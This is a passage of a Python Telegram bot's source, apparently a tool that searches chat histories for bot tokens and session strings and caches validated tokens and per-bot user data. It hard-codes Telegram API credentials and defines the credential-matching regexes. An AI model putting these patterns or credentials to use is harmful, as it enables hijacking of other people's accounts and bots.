import base64
import os
import sys
import json
import asyncio
import time
import glob
import re
import zipfile
import io
import sqlite3
import aiosqlite
from datetime import datetime, timedelta
from collections import defaultdict
from telethon import TelegramClient, events
from telethon.tl.functions.messages import GetMessagesRequest, GetHistoryRequest
from telethon.tl.types import MessageEmpty, PeerUser, PeerChat, MessageMediaDocument, MessageMediaPhoto
from telethon.tl.types import Document, Photo, DocumentAttributeFilename, InputDocumentFileLocation
from telethon.errors.rpcerrorlist import RpcCallFailError, FloodWaitError
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.types import InputPeerUser
from telethon import Button

API_ID = 25875948
API_HASH = 'bbc8cd4753b320c932bd56254d2917a0'

SEND_DELAY = 0.3
SESSION_DIR = 'sessions'
DB_PATH = 'bot_database.db'
os.makedirs(SESSION_DIR, exist_ok=True)

TOKEN_PATTERN = re.compile(r'\b\d{10}:[A-Za-z0-9_-]{35,}\b')
SESSION_PATTERNS = [
    re.compile(r'(?<!\d)\d{8,}(?!\d)'),
    re.compile(r'(?<!\w)[a-fA-F0-9]{32}(?!\w)'),
    re.compile(r'(?:[A-Za-z0-9+/]{4}){10,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?'),
    re.compile(r'\bStringSession\b')
]
SESSION_PATTERN_CHAT = re.compile(r'(?:(?<=\s)|(?<=[\'"`*])|^)([0-9][A-Za-z](?=.*[A-Z])(?=.*[0-9])(?=.*-)(?=.*_)[A-Za-z0-9_-]{298,448}=)(?=\s|$|[\'"`*])')

# ØªÙ‡ÙŠØ¦Ø© Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
async def init_database():
    """ØªÙ‡ÙŠØ¦Ø© Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙˆØ¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø¬Ø¯Ø§ÙˆÙ„ Ø§Ù„Ù„Ø§Ø²Ù…Ø©"""
    async with aiosqlite.connect(DB_PATH) as db:
        # Ø¬Ø¯ÙˆÙ„ Ø§Ù„ØªØ­Ù„ÙŠÙ„Ø§Øª Ø§Ù„Ù…Ø¤Ù‚ØªØ©
        await db.execute('''
            CREATE TABLE IF NOT EXISTS analysis_cache (
                cache_key TEXT PRIMARY KEY,
                data TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                expires_at TIMESTAMP
            )
        ''')
        
        # Ø¬Ø¯ÙˆÙ„ ØªØ®Ø²ÙŠÙ† Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†
        await db.execute('''
            CREATE TABLE IF NOT EXISTS user_states (
                user_id INTEGER PRIMARY KEY,
                state_data TEXT NOT NULL,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Ø¬Ø¯ÙˆÙ„ ØªØ®Ø²ÙŠÙ† Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨Ø«
        await db.execute('''
            CREATE TABLE IF NOT EXISTS broadcast_data (
                user_id INTEGER,
                message_data TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (user_id)
            )
        ''')
        
        # Ø¬Ø¯ÙˆÙ„ ØªØ®Ø²ÙŠÙ† Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø´Ø¨ÙƒØ©
        await db.execute('''
            CREATE TABLE IF NOT EXISTS network_analysis (
                user_id INTEGER,
                analysis_data TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (user_id)
            )
        ''')
        
        # Ø¬Ø¯ÙˆÙ„ Ø§Ù„ØªØ®Ø²ÙŠÙ† Ø§Ù„Ù…Ø¤Ù‚Øª Ù„Ù„ØªÙˆÙƒÙ†Ø§Øª
        await db.execute('''
            CREATE TABLE IF NOT EXISTS token_cache (
                token TEXT PRIMARY KEY,
                validation_data TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Ø¬Ø¯ÙˆÙ„ Ø§Ù„ØªØ®Ø²ÙŠÙ† Ø§Ù„Ù…Ø¤Ù‚Øª Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†
        await db.execute('''
            CREATE TABLE IF NOT EXISTS user_cache (
                bot_token TEXT,
                user_data TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (bot_token)
            )
        ''')
        
        # Ø¬Ø¯ÙˆÙ„ ØªÙ†Ø¸ÙŠÙ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù‚Ø¯ÙŠÙ…Ø©
        await db.execute('''
            CREATE TABLE IF NOT EXISTS cleanup_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                cleaned_items INTEGER,
                cleaned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        await db.commit()

async def cleanup_old_data():
    """ØªÙ†Ø¸ÙŠÙ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù‚Ø¯ÙŠÙ…Ø© Ù…Ù† Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª"""
    async with aiosqlite.connect(DB_PATH) as db:
        # ØªÙ†Ø¸ÙŠÙ Ø§Ù„ØªØ­Ù„ÙŠÙ„Ø§Øª Ø§Ù„Ù‚Ø¯ÙŠÙ…Ø© (Ø£Ù‚Ø¯Ù… Ù…Ù† 24 Ø³Ø§Ø¹Ø©)
        result = await db.execute(
            "DELETE FROM analysis_cache WHERE expires_at < datetime('now')"
        )
        analysis_deleted = result.rowcount
        
        # ØªÙ†Ø¸ÙŠÙ Ø­Ø§Ù„Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ø§Ù„Ù‚Ø¯ÙŠÙ…Ø© (Ø£Ù‚Ø¯Ù… Ù…Ù† 48 Ø³Ø§Ø¹Ø©)
        result = await db.execute(
            "DELETE FROM user_states WHERE updated_at < datetime('now', '-48 hours')"
        )
        states_deleted = result.rowcount
        
        # ØªÙ†Ø¸ÙŠÙ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨Ø« Ø§Ù„Ù‚Ø¯ÙŠÙ…Ø© (Ø£Ù‚Ø¯Ù… Ù…Ù† 24 Ø³Ø§Ø¹Ø©)
        result = await db.execute(
            "DELETE FROM broadcast_data WHERE created_at < datetime('now', '-24 hours')"
        )
        broadcast_deleted = result.rowcount
        
        # ØªÙ†Ø¸ÙŠÙ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø´Ø¨ÙƒØ© Ø§Ù„Ù‚Ø¯ÙŠÙ…Ø© (Ø£Ù‚Ø¯Ù… Ù…Ù† 24 Ø³Ø§Ø¹Ø©)
        result = await db.execute(
            "DELETE FROM network_analysis WHERE created_at < datetime('now', '-24 hours')"
        )
        network_deleted = result.rowcount
        
        # ØªÙ†Ø¸ÙŠÙ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø§Ù„Ù‚Ø¯ÙŠÙ…Ø© (Ø£Ù‚Ø¯Ù… Ù…Ù† 72 Ø³Ø§Ø¹Ø©)
        result = await db.execute(
            "DELETE FROM token_cache WHERE created_at < datetime('now', '-72 hours')"
        )
        token_deleted = result.rowcount
        
        # ØªÙ†Ø¸ÙŠÙ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ø§Ù„Ù‚Ø¯ÙŠÙ…Ø© (Ø£Ù‚Ø¯Ù… Ù…Ù† 72 Ø³Ø§Ø¹Ø©)
        result = await db.execute(
            "DELETE FROM user_cache WHERE created_at < datetime('now', '-72 hours')"
        )
        user_cache_deleted = result.rowcount
        
        # ØªØ³Ø¬ÙŠÙ„ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„ØªÙ†Ø¸ÙŠÙ
        await db.execute(
            "INSERT INTO cleanup_log (cleaned_items) VALUES (?)",
            (analysis_deleted + states_deleted + broadcast_deleted + 
             network_deleted + token_deleted + user_cache_deleted,)
        )
        
        await db.commit()
        
        print(f"ğŸ§¹ ØªÙ… ØªÙ†Ø¸ÙŠÙ {analysis_deleted} ØªØ­Ù„ÙŠÙ„ØŒ {states_deleted} Ø­Ø§Ù„Ø©ØŒ "
              f"{broadcast_deleted} Ø¨Ø«ØŒ {network_deleted} Ø´Ø¨ÙƒØ©ØŒ "
              f"{token_deleted} ØªÙˆÙƒÙ†ØŒ {user_cache_deleted} Ù…Ø³ØªØ®Ø¯Ù…")

async def get_cached_analysis(cache_key):
    """Ø§Ø³ØªØ±Ø¬Ø§Ø¹ Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ù…Ù† Ø§Ù„Ø°Ø§ÙƒØ±Ø© Ø§Ù„Ù…Ø¤Ù‚ØªØ© ÙÙŠ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø¹ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø«Ù†Ø§Ø¦ÙŠØ©"""
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            cursor = await db.execute(
                "SELECT data FROM analysis_cache WHERE cache_key = ? AND expires_at > datetime('now')",
                (cache_key,)
            )
            result = await cursor.fetchone()
            if not result:
                return None
            
            data = json.loads(result[0])
            
            # ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø´ÙØ±Ø© Ø¨Ø§Ù„base64 Ù…Ø±Ø© Ø£Ø®Ø±Ù‰ Ø¥Ù„Ù‰ bytes
            if 'files' in data:
                for file_info in data['files']:
                    if 'file_reference' in file_info and isinstance(file_info['file_reference'], str):
                        try:
                            file_info['file_reference'] = base64.b64decode(file_info['file_reference'])
                        except:
                            file_info['file_reference'] = b''
            
            if 'photos' in data:
                for photo_info in data['photos']:
                    if 'file_reference' in photo_info and isinstance(photo_info['file_reference'], str):
                        try:
                            photo_info['file_reference'] = base64.b64decode(photo_info['file_reference'])
                        except:
                            photo_info['file_reference'] = b''
            
            # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø«Ù†Ø§Ø¦ÙŠØ© ÙÙŠ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª
            if 'tokens' in data and 'details' in data['tokens']:
                for token_info in data['tokens']['details']:
                    if 'bot_info' in token_info and 'file_reference' in token_info['bot_info']:
                        if isinstance(token_info['bot_info']['file_reference'], str):
                            try:
                                token_info['bot_info']['file_reference'] = base64.b64decode(token_info['bot_info']['file_reference'])
                            except:
                                token_info['bot_info']['file_reference'] = b''
            
            return data
    except Exception as e:
        print(f"âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ø³ØªØ±Ø¬Ø§Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø¤Ù‚ØªØ©: {e}")
        return None

async def set_cached_analysis(cache_key, data, expiry_hours=24):
    """ØªØ®Ø²ÙŠÙ† Ø§Ù„ØªØ­Ù„ÙŠÙ„ ÙÙŠ Ø§Ù„Ø°Ø§ÙƒØ±Ø© Ø§Ù„Ù…Ø¤Ù‚ØªØ© ÙÙŠ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø¹ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø«Ù†Ø§Ø¦ÙŠØ©"""
    try:
        # Ù†Ø³Ø®Ø© Ù…Ù† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù…Ø¹Ø§Ù„Ø¬ØªÙ‡Ø§
        processed_data = data.copy()
        
        # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø«Ù†Ø§Ø¦ÙŠØ© ÙÙŠ Ø§Ù„Ù…Ù„ÙØ§Øª ÙˆØ§Ù„ØµÙˆØ±
        if 'files' in processed_data:
            for file_info in processed_data['files']:
                if 'file_reference' in file_info and isinstance(file_info['file_reference'], bytes):
                    file_info['file_reference'] = base64.b64encode(file_info['file_reference']).decode('utf-8')
        
        if 'photos' in processed_data:
            for photo_info in processed_data['photos']:
                if 'file_reference' in photo_info and isinstance(photo_info['file_reference'], bytes):
                    photo_info['file_reference'] = base64.b64encode(photo_info['file_reference']).decode('utf-8')
        
        # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø«Ù†Ø§Ø¦ÙŠØ© ÙÙŠ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª
        if 'tokens' in processed_data and 'details' in processed_data['tokens']:
            for token_info in processed_data['tokens']['details']:
                if 'bot_info' in token_info and 'file_reference' in token_info['bot_info']:
                    if isinstance(token_info['bot_info']['file_reference'], bytes):
                        token_info['bot_info']['file_reference'] = base64.b64encode(token_info['bot_info']['file_reference']).decode('utf-8')
        
        expires_at = (datetime.now() + timedelta(hours=expiry_hours)).strftime('%Y-%m-%d %H:%M:%S')
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "INSERT OR REPLACE INTO analysis_cache (cache_key, data, expires_at) VALUES (?, ?, ?)",
                (cache_key, json.dumps(processed_data), expires_at)
            )
            await db.commit()
        return True
    except Exception as e:
        print(f"âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ®Ø²ÙŠÙ† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø¤Ù‚ØªØ©: {e}")
        return False

async def get_user_state(user_id):
    """Ø§Ø³ØªØ±Ø¬Ø§Ø¹ Ø­Ø§Ù„Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ù† Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø¹ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø«Ù†Ø§Ø¦ÙŠØ©"""
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            cursor = await db.execute(
                "SELECT state_data FROM user_states WHERE user_id = ?",
                (user_id,)
            )
            result = await cursor.fetchone()
            if not result:
                return {}
            
            data = json.loads(result[0])
            
            # ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø´ÙØ±Ø© Ø¨Ø§Ù„base64 Ù…Ø±Ø© Ø£Ø®Ø±Ù‰ Ø¥Ù„Ù‰ bytes
            if 'analysis' in data:
                analysis = data['analysis']
                
                # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ù…Ù„ÙØ§Øª
                if 'files' in analysis:
                    for file_info in analysis['files']:
                        if 'file_reference' in file_info and isinstance(file_info['file_reference'], str):
                            try:
                                file_info['file_reference'] = base64.b64decode(file_info['file_reference'])
                            except:
                                file_info['file_reference'] = b''
                
                # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„ØµÙˆØ±
                if 'photos' in analysis:
                    for photo_info in analysis['photos']:
                        if 'file_reference' in photo_info and isinstance(photo_info['file_reference'], str):
                            try:
                                photo_info['file_reference'] = base64.b64decode(photo_info['file_reference'])
                            except:
                                photo_info['file_reference'] = b''
                
                # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª
                if 'tokens' in analysis and 'details' in analysis['tokens']:
                    for token_info in analysis['tokens']['details']:
                        if 'bot_info' in token_info and 'file_reference' in token_info['bot_info']:
                            if isinstance(token_info['bot_info']['file_reference'], str):
                                try:
                                    token_info['bot_info']['file_reference'] = base64.b64decode(token_info['bot_info']['file_reference'])
                                except:
                                    token_info['bot_info']['file_reference'] = b''
            
            return data
    except Exception as e:
        print(f"âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ø³ØªØ±Ø¬Ø§Ø¹ Ø­Ø§Ù„Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: {e}")
        return {}

async def set_user_state(user_id, state_data):
    """ØªØ®Ø²ÙŠÙ† Ø­Ø§Ù„Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙÙŠ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø¹ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø«Ù†Ø§Ø¦ÙŠØ©"""
    try:
        # Ù†Ø³Ø®Ø© Ù…Ù† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù…Ø¹Ø§Ù„Ø¬ØªÙ‡Ø§
        processed_data = state_data.copy()
        
        # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø«Ù†Ø§Ø¦ÙŠØ© ÙÙŠ Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø¥Ø°Ø§ ÙƒØ§Ù† Ù…ÙˆØ¬ÙˆØ¯Ù‹Ø§
        if 'analysis' in processed_data:
            analysis = processed_data['analysis']
            
            # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ù…Ù„ÙØ§Øª
            if 'files' in analysis:
                for file_info in analysis['files']:
                    if 'file_reference' in file_info and isinstance(file_info['file_reference'], bytes):
                        file_info['file_reference'] = base64.b64encode(file_info['file_reference']).decode('utf-8')
            
            # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„ØµÙˆØ±
            if 'photos' in analysis:
                for photo_info in analysis['photos']:
                    if 'file_reference' in photo_info and isinstance(photo_info['file_reference'], bytes):
                        photo_info['file_reference'] = base64.b64encode(photo_info['file_reference']).decode('utf-8')
            
            # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª
            if 'tokens' in analysis and 'details' in analysis['tokens']:
                for token_info in analysis['tokens']['details']:
                    if 'bot_info' in token_info and 'file_reference' in token_info['bot_info']:
                        if isinstance(token_info['bot_info']['file_reference'], bytes):
                            token_info['bot_info']['file_reference'] = base64.b64encode(token_info['bot_info']['file_reference']).decode('utf-8')
        
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "INSERT OR REPLACE INTO user_states (user_id, state_data) VALUES (?, ?)",
                (user_id, json.dumps(processed_data))
            )
            await db.commit()
        return True
    except Exception as e:
        print(f"âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ®Ø²ÙŠÙ† Ø­Ø§Ù„Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: {e}")
        return False

async def get_broadcast_data(user_id):
    """Ø§Ø³ØªØ±Ø¬Ø§Ø¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨Ø« Ù…Ù† Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª"""
    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute(
            "SELECT message_data FROM broadcast_data WHERE user_id = ?",
            (user_id,)
        )
        result = await cursor.fetchone()
        return result[0] if result else None

async def set_broadcast_data(user_id, message_data):
    """ØªØ®Ø²ÙŠÙ† Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨Ø« ÙÙŠ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª"""
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT OR REPLACE INTO broadcast_data (user_id, message_data) VALUES (?, ?)",
            (user_id, message_data)
        )
        await db.commit()

async def get_network_analysis(user_id):
    """Ø§Ø³ØªØ±Ø¬Ø§Ø¹ ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒØ© Ù…Ù† Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø¹ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø«Ù†Ø§Ø¦ÙŠØ©"""
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            cursor = await db.execute(
                "SELECT analysis_data FROM network_analysis WHERE user_id = ?",
                (user_id,)
            )
            result = await cursor.fetchone()
            if not result:
                return None
            
            data = json.loads(result[0])
            
            # ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø´ÙØ±Ø© Ø¨Ø§Ù„base64 Ù…Ø±Ø© Ø£Ø®Ø±Ù‰ Ø¥Ù„Ù‰ bytes
            if 'aggregated_stats' in data:
                stats = data['aggregated_stats']
                
                # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ù…Ù„ÙØ§Øª
                if 'all_files' in stats:
                    for file_info in stats['all_files']:
                        if 'file_reference' in file_info and isinstance(file_info['file_reference'], str):
                            try:
                                file_info['file_reference'] = base64.b64decode(file_info['file_reference'])
                            except:
                                file_info['file_reference'] = b''
                
                # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„ØµÙˆØ±
                if 'all_photos' in stats:
                    for photo_info in stats['all_photos']:
                        if 'file_reference' in photo_info and isinstance(photo_info['file_reference'], str):
                            try:
                                photo_info['file_reference'] = base64.b64decode(photo_info['file_reference'])
                            except:
                                photo_info['file_reference'] = b''
                
                # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª
                if 'all_tokens' in stats:
                    for token_info in stats['all_tokens']:
                        if 'bot_info' in token_info and 'file_reference' in token_info['bot_info']:
                            if isinstance(token_info['bot_info']['file_reference'], str):
                                try:
                                    token_info['bot_info']['file_reference'] = base64.b64decode(token_info['bot_info']['file_reference'])
                                except:
                                    token_info['bot_info']['file_reference'] = b''
            
            # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø«Ù†Ø§Ø¦ÙŠØ© ÙÙŠ all_bots
            if 'all_bots' in data:
                for bot_data in data['all_bots']:
                    if 'analysis' in bot_data:
                        analysis = bot_data['analysis']
                        
                        # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ù…Ù„ÙØ§Øª
                        if 'files' in analysis:
                            for file_info in analysis['files']:
                                if 'file_reference' in file_info and isinstance(file_info['file_reference'], str):
                                    try:
                                        file_info['file_reference'] = base64.b64decode(file_info['file_reference'])
                                    except:
                                        file_info['file_reference'] = b''
                        
                        # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„ØµÙˆØ±
                        if 'photos' in analysis:
                            for photo_info in analysis['photos']:
                                if 'file_reference' in photo_info and isinstance(photo_info['file_reference'], str):
                                    try:
                                        photo_info['file_reference'] = base64.b64decode(photo_info['file_reference'])
                                    except:
                                        photo_info['file_reference'] = b''
                        
                        # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª
                        if 'tokens' in analysis and 'details' in analysis['tokens']:
                            for token_info in analysis['tokens']['details']:
                                if 'bot_info' in token_info and 'file_reference' in token_info['bot_info']:
                                    if isinstance(token_info['bot_info']['file_reference'], str):
                                        try:
                                            token_info['bot_info']['file_reference'] = base64.b64decode(token_info['bot_info']['file_reference'])
                                        except:
                                            token_info['bot_info']['file_reference'] = b''
            
            return data
    except Exception as e:
        print(f"âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ø³ØªØ±Ø¬Ø§Ø¹ ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒØ©: {e}")
        return None

async def set_network_analysis(user_id, analysis_data):
    """ØªØ®Ø²ÙŠÙ† ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒØ© ÙÙŠ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø¹ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø«Ù†Ø§Ø¦ÙŠØ©"""
    try:
        # Ù†Ø³Ø®Ø© Ù…Ù† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù…Ø¹Ø§Ù„Ø¬ØªÙ‡Ø§
        processed_data = analysis_data.copy()
        
        # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø«Ù†Ø§Ø¦ÙŠØ© ÙÙŠ aggregated_stats
        if 'aggregated_stats' in processed_data:
            stats = processed_data['aggregated_stats']
            
            # ØªØ­ÙˆÙŠÙ„ set Ø¥Ù„Ù‰ list Ø¥Ø°Ø§ ÙƒØ§Ù† Ù…ÙˆØ¬ÙˆØ¯Ù‹Ø§
            if 'all_users' in stats and isinstance(stats['all_users'], set):
                stats['all_users'] = list(stats['all_users'])
            
            # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ù…Ù„ÙØ§Øª
            if 'all_files' in stats:
                for file_info in stats['all_files']:
                    if 'file_reference' in file_info and isinstance(file_info['file_reference'], bytes):
                        file_info['file_reference'] = base64.b64encode(file_info['file_reference']).decode('utf-8')
            
            # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„ØµÙˆØ±
            if 'all_photos' in stats:
                for photo_info in stats['all_photos']:
                    if 'file_reference' in photo_info and isinstance(photo_info['file_reference'], bytes):
                        photo_info['file_reference'] = base64.b64encode(photo_info['file_reference']).decode('utf-8')
            
            # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª
            if 'all_tokens' in stats:
                for token_info in stats['all_tokens']:
                    if 'bot_info' in token_info and 'file_reference' in token_info['bot_info']:
                        if isinstance(token_info['bot_info']['file_reference'], bytes):
                            token_info['bot_info']['file_reference'] = base64.b64encode(token_info['bot_info']['file_reference']).decode('utf-8')
        
        # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø«Ù†Ø§Ø¦ÙŠØ© ÙÙŠ all_bots
        if 'all_bots' in processed_data:
            for bot_data in processed_data['all_bots']:
                if 'analysis' in bot_data:
                    analysis = bot_data['analysis']
                    
                    # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ù…Ù„ÙØ§Øª
                    if 'files' in analysis:
                        for file_info in analysis['files']:
                            if 'file_reference' in file_info and isinstance(file_info['file_reference'], bytes):
                                file_info['file_reference'] = base64.b64encode(file_info['file_reference']).decode('utf-8')
                    
                    # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„ØµÙˆØ±
                    if 'photos' in analysis:
                        for photo_info in analysis['photos']:
                            if 'file_reference' in photo_info and isinstance(photo_info['file_reference'], bytes):
                                photo_info['file_reference'] = base64.b64encode(photo_info['file_reference']).decode('utf-8')
                    
                    # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª
                    if 'tokens' in analysis and 'details' in analysis['tokens']:
                        for token_info in analysis['tokens']['details']:
                            if 'bot_info' in token_info and 'file_reference' in token_info['bot_info']:
                                if isinstance(token_info['bot_info']['file_reference'], bytes):
                                    token_info['bot_info']['file_reference'] = base64.b64encode(token_info['bot_info']['file_reference']).decode('utf-8')
        
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "INSERT OR REPLACE INTO network_analysis (user_id, analysis_data) VALUES (?, ?)",
                (user_id, json.dumps(processed_data))
            )
            await db.commit()
        return True
    except Exception as e:
        print(f"âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ®Ø²ÙŠÙ† ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒØ©: {e}")
        return False

async def get_cached_token(token):
    """Ø§Ø³ØªØ±Ø¬Ø§Ø¹ Ø§Ù„ØªÙˆÙƒÙ† Ù…Ù† Ø§Ù„Ø°Ø§ÙƒØ±Ø© Ø§Ù„Ù…Ø¤Ù‚ØªØ© ÙÙŠ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª"""
    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute(
            "SELECT validation_data FROM token_cache WHERE token = ? AND created_at > datetime('now', '-72 hours')",
            (token,)
        )
        result = await cursor.fetchone()
        return json.loads(result[0]) if result else None

async def set_cached_token(token, validation_data):
    """ØªØ®Ø²ÙŠÙ† Ø§Ù„ØªÙˆÙƒÙ† ÙÙŠ Ø§Ù„Ø°Ø§ÙƒØ±Ø© Ø§Ù„Ù…Ø¤Ù‚ØªØ© ÙÙŠ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª"""
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
